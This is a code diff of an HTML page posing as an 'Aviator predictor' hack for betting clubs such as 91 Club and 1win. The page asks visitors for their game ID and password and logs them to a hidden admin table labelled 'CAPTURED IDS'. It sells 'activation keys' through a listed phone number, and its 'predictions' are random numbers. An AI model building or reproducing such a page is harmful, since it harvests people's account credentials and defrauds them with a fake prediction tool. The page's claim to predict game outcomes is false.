@@ -3,129 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KADIR 786 | MASTER PRO SYSTEM</title>
+    <title>KADIR 786 | MASTER HACK v5.0</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 0; }
         
-        /* 1. एडमिन कंट्रोल - डेटा सेविंग सिस्टम */
-        .admin-panel { background: #0a0a0a; border-bottom: 2px solid #00ff41; padding: 15px; }
-        .adm-input { background: #000; border: 1px solid #333; color: #00ff41; padding: 8px; width: 30%; border-radius: 5px; }
-        #adminDashboard { display: none; background: #050505; padding: 10px; margin-top: 10px; border: 1px dashed #00ff41; }
+        /* 1. ADMIN PANEL (TOP) */
+        .admin-header { background: #000; border-bottom: 2px solid #00ff41; padding: 10px; }
+        .adm-row { display: flex; gap: 5px; }
+        .adm-field { background: #111; border: 1px solid #333; color: #00ff41; padding: 10px; border-radius: 5px; width: 35%; }
+        #admLogs { display: none; background: #050505; padding: 10px; border: 1px dashed #00ff41; margin-top: 10px; }
 
-        /* 2. यूजर इंटरफेस */
+        /* 2. USER LOGIN */
         .container { padding: 20px; text-align: center; }
-        .u-input { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
-        .blue-btn { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; }
+        .u-field { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
+        .btn-blue { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; }
 
-        /* 3. प्रेडिक्शन पेज (असली वर्किंग लुक) */
-        #predPage { display: none; padding: 20px; text-align: center; }
-        .mult-val { font-size: 70px; font-weight: bold; margin: 30px 0; color: #fff; text-shadow: 0 0 20px red; }
+        /* 3. CLUB GRID */
+        #clubGrid { display: none; padding: 20px; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .club-card { background: #1a1a1a; border: 1px solid #ffae00; border-radius: 15px; padding: 20px; cursor: pointer; position: relative; background-size: cover; min-height: 80px; }
+
+        /* 4. AVIATOR PREDICTOR PAGE (The Real One) */
+        #predPage { display: none; text-align: center; padding: 20px; }
+        .mult-display { font-size: 75px; font-weight: bold; margin: 30px 0; color: #fff; text-shadow: 0 0 20px red; }
+        .btn-red { background: #b30000; color: #fff; width: 100%; max-width: 320px; padding: 15px; border: none; border-radius: 10px; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
         
-        /* कस्टमर सपोर्ट */
-        .support-box { margin-top: 30px; padding: 15px; background: #111; border-radius: 10px; font-size: 13px; }
-        .support-box a { color: #ffae00; text-decoration: none; font-weight: bold; }
-
-        table { width: 100%; font-size: 10px; color: #00ff41; border-collapse: collapse; margin-top: 10px; }
-        th, td { border: 1px solid #222; padding: 5px; text-align: left; }
+        .support { margin-top: 20px; padding: 15px; background: #111; border-radius: 10px; }
+        table { width: 100%; font-size: 11px; color: #00ff41; border-collapse: collapse; }
+        th, td { border: 1px solid #222; padding: 5px; }
     </style>
 </head>
 <body>
 
-<div class="admin-panel">
-    <div id="admLogin">
-        <span style="font-size:12px; color:#00ff41;">MASTER ADMIN</span>
-        <input type="password" id="admPass" class="adm-input" placeholder="Pass 9580">
-        <button onclick="loginAdm()" style="background:#00ff41; border:none; padding:8px; border-radius:5px; font-weight:bold;">LOGIN</button>
+<div class="admin-header">
+    <div id="admLoginBox" class="adm-row">
+        <input type="text" id="aID" class="adm-field" placeholder="Kadir 786">
+        <input type="password" id="aPass" class="adm-field" placeholder="9580">
+        <button onclick="loginAdm()" style="background:#00ff41; border:none; border-radius:5px; flex-grow:1; font-weight:bold;">LOGIN</button>
     </div>
-    <div id="adminDashboard">
-        <h4>CAPTURED LOGINS (PERMANENT)</h4>
-        <table>
-            <thead><tr><th>EMAIL/ID</th><th>PASSWORD</th><th>TIME</th></tr></thead>
-            <tbody id="logTable"></tbody>
-        </table>
-        <br>
-        <button onclick="genKey()" style="background:#ffae00; border:none; padding:10px; border-radius:5px; font-weight:bold;">GENERATE ACTIVATION KEY</button>
-        <div id="newKey" style="color:yellow; font-weight:bold; margin-top:10px; font-size:18px;"></div>
+    <div id="admLogs">
+        <h4 style="margin:0 0 10px 0;">CAPTURED IDS:</h4>
+        <table id="logTable"><thead><tr><th>ID</th><th>PASS</th><th>TIME</th></tr></thead><tbody id="logBody"></tbody></table>
+        <button onclick="genKey()" style="background:#ffae00; border:none; padding:10px; margin-top:10px; border-radius:5px; font-weight:bold;">GENERATE ACTIVATION KEY</button>
+        <p id="showKey" style="color:yellow; font-weight:bold;"></p>
     </div>
 </div>
 
 <div class="container">
-    <div id="step1">
-        <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" width="60">
+    <div id="userLogin">
         <h2>KADIR 786</h2>
-        <p style="color:#666;">Enter Old Game ID to Activate Hack</p>
-        <input type="text" id="uEmail" class="u-input" placeholder="Old Game Email/ID">
-        <input type="password" id="uPass" class="u-input" placeholder="Game Password">
-        <button class="blue-btn" onclick="userAuth()">ACTIVATE ID</button>
+        <p style="color:#888;">Enter Old Game ID to Start Hack</p>
+        <input type="text" id="uMail" class="u-field" placeholder="Old Game ID/Email">
+        <input type="password" id="uPw" class="u-field" placeholder="Game Password">
+        <button class="btn-blue" onclick="userAuth()">LOGIN & ACTIVATE</button>
+    </div>
+
+    <div id="clubGrid">
+        <div class="club-card" onclick="openHack('91 Club')"><h4>91 Club</h4></div>
+        <div class="club-card" onclick="openHack('55 Club')"><h4>55 Club</h4></div>
+        <div class="club-card" onclick="openHack('Daman')"><h4>Daman</h4></div>
+        <div class="club-card" onclick="openHack('1win')"><h4>1win</h4></div>
     </div>
 
     <div id="predPage">
-        <h2 style="color:red; margin:0;">AVIATOR PREDICTOR v5.0</h2>
-        <div class="mult-val" id="number">1.00x</div>
+        <h2 id="clubName" style="color:red; margin:0;">AVIATOR PREDICTOR v5.0</h2>
+        <div class="mult-display" id="result">1.00x</div>
         
-        <input type="text" id="actKey" class="u-input" placeholder="Enter Activation Code">
-        <button class="blue-btn" style="background:#b30000; margin-bottom:10px;" onclick="startHack()">GET PREDICTION</button>
+        <input type="text" id="activeKey" class="u-field" placeholder="Enter Activation Code">
+        <button class="btn-red" onclick="getSignal()">GET PREDICTION</button>
         
-        <div class="support-box">
-            <p style="margin:0; color:#888;">For Activation Code, Contact Admin:</p>
-            <p style="font-size:18px; margin:5px 0;"><a href="tel:9554527334">📞 9554527334</a></p>
-            <p style="color:#007bff;">Telegram: @Kadir786_Admin</p>
+        <div class="support">
+            <p style="color:#888; font-size:12px;">Contact Admin for Code:</p>
+            <a href="tel:9554527334" style="color:#ffae00; font-size:20px; text-decoration:none; font-weight:bold;">📞 9554527334</a>
         </div>
     </div>
 </div>
 
 <script>
-    let validKeys = JSON.parse(localStorage.getItem('keys')) || [];
+    let keys = JSON.parse(localStorage.getItem('myKeys')) || [];
 
-    // एडमिन लॉगिन
     function loginAdm() {
-        if(document.getElementById('admPass').value === "9580") {
-            document.getElementById('adminDashboard').style.display = 'block';
+        if(document.getElementById('aID').value === "Kadir 786" && document.getElementById('aPass').value === "9580") {
+            document.getElementById('admLogs').style.display = 'block';
             loadLogs();
-        } else { alert("Access Denied!"); }
+        } else { alert("Access Denied"); }
     }
 
-    // एक्टिवेशन कोड बनाना
     function genKey() {
         let k = "KDR-" + Math.floor(Math.random()*9000+1000);
-        validKeys.push(k);
-        localStorage.setItem('keys', JSON.stringify(validKeys));
-        document.getElementById('newKey').innerText = "Generated: " + k;
+        keys.push(k);
+        localStorage.setItem('myKeys', JSON.stringify(keys));
+        document.getElementById('showKey').innerText = "New Key: " + k;
     }
 
-    // यूजर लॉगिन और डेटा सेविंग (Permanent)
     function userAuth() {
-        let e = document.getElementById('uEmail').value;
-        let p = document.getElementById('uPass').value;
+        let e = document.getElementById('uMail').value;
+        let p = document.getElementById('uPw').value;
         if(e && p) {
-            let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
-            logs.push({e, p, t: new Date().toLocaleString()});
-            localStorage.setItem('userLogs', JSON.stringify(logs));
-            
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('predPage').style.display = 'block';
-        } else { alert("Enter ID & Password!"); }
+            let logs = JSON.parse(localStorage.getItem('captured')) || [];
+            logs.push({e, p, t: new Date().toLocaleTimeString()});
+            localStorage.setItem('captured', JSON.stringify(logs));
+            document.getElementById('userLogin').style.display = 'none';
+            document.getElementById('clubGrid').style.display = 'grid';
+        } else { alert("Fill Details!"); }
     }
 
     function loadLogs() {
-        let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
-        let html = "";
-        logs.forEach(l => html += `<tr><td>${l.e}</td><td>${l.p}</td><td>${l.t}</td></tr>`);
-        document.getElementById('logTable').innerHTML = html;
+        let logs = JSON.parse(localStorage.getItem('captured')) || [];
+        let h = "";
+        logs.forEach(l => h += `<tr><td>${l.e}</td><td>${l.p}</td><td>${l.t}</td></tr>`);
+        document.getElementById('logBody').innerHTML = h;
     }
 
-    // असली वर्किंग प्रेडिक्शन
-    function startHack() {
-        let inputKey = document.getElementById('actKey').value;
-        if(validKeys.includes(inputKey)) {
-            document.getElementById('number').innerText = "SEARCHING...";
+    function openHack(name) {
+        document.getElementById('clubGrid').style.display = 'none';
+        document.getElementById('predPage').style.display = 'block';
+        document.getElementById('clubName').innerText = name + " Predictor v5.0";
+    }
+
+    function getSignal() {
+        let k = document.getElementById('activeKey').value;
+        if(keys.includes(k)) {
+            document.getElementById('result').innerText = "WAIT...";
             setTimeout(() => {
-                let res = (Math.random() * 4 + 1.1).toFixed(2);
-                document.getElementById('number').innerText = res + "x";
+                document.getElementById('result').innerText = (Math.random() * 3 + 1.2).toFixed(2) + "x";
             }, 1500);
-        } else {
-            alert("Wrong Activation Code! Call Admin to Buy.");
-        }
+        } else { alert("Invalid Code! Contact Admin."); }
     }
 </script>
 </body>
